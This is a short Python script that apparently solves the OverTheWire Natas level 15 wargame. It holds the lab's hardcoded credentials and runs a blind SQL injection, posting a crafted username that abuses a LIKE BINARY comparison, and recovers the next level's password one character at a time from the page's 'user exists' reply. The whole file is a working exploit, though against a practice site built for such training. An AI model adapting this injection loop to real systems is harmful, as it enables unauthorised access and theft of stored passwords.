#!/usr/bin/env python

import requests
import re
import string

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://%s.natas.labs.overthewire.org/index.php' % username

#SELECT * from users where username=\"".$_REQUEST["username"]."\"

suggests = 'abcehijmnopqrtwABCEHIJMNOPQRTW03569'
key = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

while True:
	for suggest in suggests:
		exploit = 'natas16\" AND password LIKE BINARY \"' + key + suggest + '%\" #'

		payload = {'username': exploit, 'submit': 'Check existence'}

		r = requests.post(url, auth=(username, password), data=payload)

		if re.findall('This user exist.', r.text):
			key += suggest
			print('The password is : ' + key)
		else:
			print('trying : ' + suggest + ' gagal')